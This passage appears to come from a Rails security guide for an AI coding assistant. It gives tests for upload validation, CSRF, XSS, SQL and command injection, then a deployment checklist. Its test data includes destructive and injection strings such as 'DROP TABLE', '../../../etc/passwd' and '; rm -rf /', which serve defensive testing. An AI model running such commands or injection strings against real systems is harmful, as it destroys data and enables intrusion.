    feedback.image.attach(io: File.open("test/fixtures/files/script.exe"),
                          filename: "malicious.exe", content_type: "application/x-msdownload")
    assert_not feedback.valid?
    assert_includes feedback.errors[:image], "must be a JPEG, PNG, or GIF"
  end

  test "rejects file with spoofed magic bytes" do
    feedback = Feedback.new(content: "Test")
    feedback.image.attach(io: StringIO.new("Not a real image"),
                          filename: "fake.jpg", content_type: "image/jpeg")
    assert_not feedback.valid?
    assert_includes feedback.errors[:image], "file signature doesn't match"
  end

  test "rejects oversized file" do
    feedback = Feedback.new(content: "Test")
    large_file = Tempfile.new(["large", ".jpg"])
    large_file.write("x" * 6.megabytes)
    large_file.rewind
    feedback.image.attach(io: large_file, filename: "huge.jpg", content_type: "image/jpeg")
    assert_not feedback.valid?
    assert_includes feedback.errors[:image], "must be less than 5MB"
  ensure
    large_file.close && large_file.unlink
  end
end

# test/controllers/feedbacks_controller_test.rb
class FeedbacksControllerTest < ActionDispatch::IntegrationTest
  # CSRF Protection
  test "rejects POST without CSRF token" do
    assert_raises(ActionController::InvalidAuthenticityToken) do
      post feedbacks_url,
           params: { feedback: { content: "test" } },
           headers: { "X-CSRF-Token" => "invalid_token" }
    end
  end

  test "accepts POST with valid CSRF token" do
    post feedbacks_url, params: { feedback: { content: "test", recipient_email: "user@example.com" } }
    assert_response :redirect
  end

  # SQL Injection via Sort Parameters
  test "index with malicious sort parameter is safe" do
    get projects_path, params: { sort: "name); DROP TABLE projects; --" }

    assert_response :success
    assert Project.count > 0
  end
end

# test/system/xss_prevention_test.rb
class XssPreventionTest < ApplicationSystemTestCase
  test "user cannot inject scripts via comment" do
    visit new_comment_path
    fill_in "Comment", with: "<script>alert('XSS')</script>"
    click_button "Submit"

    assert_text "<script>alert('XSS')</script>"  # Escaped, not executed
  end

  test "form includes CSRF token" do
    visit new_feedback_path
    assert_selector "input[name='authenticity_token'][type='hidden']"
  end
end

# test/jobs/pdf_generation_job_test.rb
class PdfGenerationJobTest < ActiveJob::TestCase
  # Command Injection Prevention
  test "validates output path format" do
    assert_raises(ArgumentError, /Invalid output path/) do
      PdfGenerationJob.perform_now(feedbacks(:one).id, "invalid_path.pdf")
    end
  end

  test "prevents directory traversal in path" do
    assert_raises(ArgumentError, /Invalid output path|outside allowed/i) do
      PdfGenerationJob.perform_now(feedbacks(:one).id, "../../../etc/passwd")
    end
  end

  test "rejects command injection in path" do
    assert_raises(ArgumentError) do
      PdfGenerationJob.perform_now(feedbacks(:one).id, "output.pdf; rm -rf /")
    end
  end
end

# test/controllers/downloads_controller_test.rb
class DownloadsControllerTest < ActionDispatch::IntegrationTest
  test "requires authentication for file downloads" do
    feedback = feedbacks(:one)
    get feedback_download_path(feedback, feedback.documents.first)
    assert_redirected_to login_path
  end

  test "serves file with secure headers" do
    sign_in users(:user)
    feedback = users(:user).feedbacks.first
    get feedback_download_path(feedback, feedback.documents.first)

    assert_response :success
    assert_equal "attachment", response.headers["Content-Disposition"].split(";").first
  end

  test "prevents unauthorized access to other users files" do
    sign_in users(:user)
    other_feedback = users(:other_user).feedbacks.first

    get feedback_download_path(other_feedback, other_feedback.documents.first)
    assert_response :forbidden
  end
end

```
</testing>

## Security Checklist

### Before Deploying

**XSS Prevention:**
- [ ] Never use `html_safe` or `raw` on user input
- [ ] Implement Content Security Policy headers
- [ ] Test with `<script>alert('XSS')</script>` in all user inputs
- [ ] Review all `sanitize` calls have explicit allowlists
- [ ] Verify ViewComponents used for complex rendering

**SQL Injection Prevention:**
- [ ] No string interpolation in SQL queries (`"WHERE name = '#{value}'"`)
- [ ] All queries use hash conditions or placeholders
- [ ] `sanitize_sql_like` used for LIKE queries
- [ ] ORDER BY uses allowlist validation
- [ ] Test with `'; DROP TABLE users; --` in search inputs

**CSRF Protection:**
- [ ] `csrf_meta_tags` in application layout
- [ ] All forms use `form_with` (includes token)
- [ ] JavaScript requests include `X-CSRF-Token` header
- [ ] API endpoints properly skip CSRF (with token auth)
- [ ] Test POST/DELETE without CSRF token fails

**File Upload Security:**
- [ ] ActiveStorage used (or manual filename sanitization)
- [ ] Triple validation: content type + extension + magic bytes
- [ ] File size limits at application and model levels
- [ ] Dangerous file types force download (SVG, HTML)
- [ ] Files stored outside public directory
- [ ] Virus scanning in production
- [ ] Test with renamed .php→.jpg file

**Command Injection Prevention:**
- [ ] No string interpolation in system commands
- [ ] Array form used: `system("cmd", arg1, arg2)`
- [ ] Input validation with strict allowlists
- [ ] Ruby methods preferred over shell commands
- [ ] Path validation prevents directory traversal
- [ ] Test with `; rm -rf /` in file paths

### Security Headers

```ruby
# config/application.rb
config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-Content-Type-Options' => 'nosniff',
  'X-XSS-Protection' => '1; mode=block',
  'Referrer-Policy' => 'strict-origin-when-cross-origin'
}

```

### Production Monitoring

**Log Security Events:**
- CSRF failures
- CSP violations
- Malware detection in uploads
- Failed authentication attempts
- SQL injection attempts (unusual queries)
- Command injection attempts

**Alert On:**
- Multiple CSRF failures from same IP
- Malware detected in uploads
- CSP violation patterns
- Repeated authentication failures
- SQL error patterns in logs

<related-skills>
- rails-ai:controllers - Strong parameters for mass assignment protection
- rails-ai:models - Input validation patterns
- rails-ai:views - XSS prevention in templates
- rails-ai:testing - Security testing strategies
</related-skills>

<resources>

**Official Documentation:**
- [Rails Guides - Securing Rails Applications](https://guides.rubyonrails.org/security.html)

**Security Standards:**
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Most critical web app security risks
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP File Upload Security](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

</resources>
